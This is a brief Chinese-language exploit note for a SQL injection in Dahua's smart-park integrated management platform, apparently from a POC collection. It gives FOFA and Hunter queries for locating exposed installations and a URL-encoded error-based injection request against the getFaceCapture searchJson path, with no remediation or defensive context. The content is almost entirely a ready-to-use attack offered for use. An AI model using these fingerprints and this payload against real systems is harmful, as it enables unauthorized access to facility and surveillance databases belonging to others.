# 大华 智慧园区综合管理平台 searchJson SQL注入漏洞

## 网络测绘

fofa: app="dahua-智慧园区综合管理平台"

hunter: app.name="Dahua 大华 智慧园区管理平台"

## POC / EXP

```
/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D
```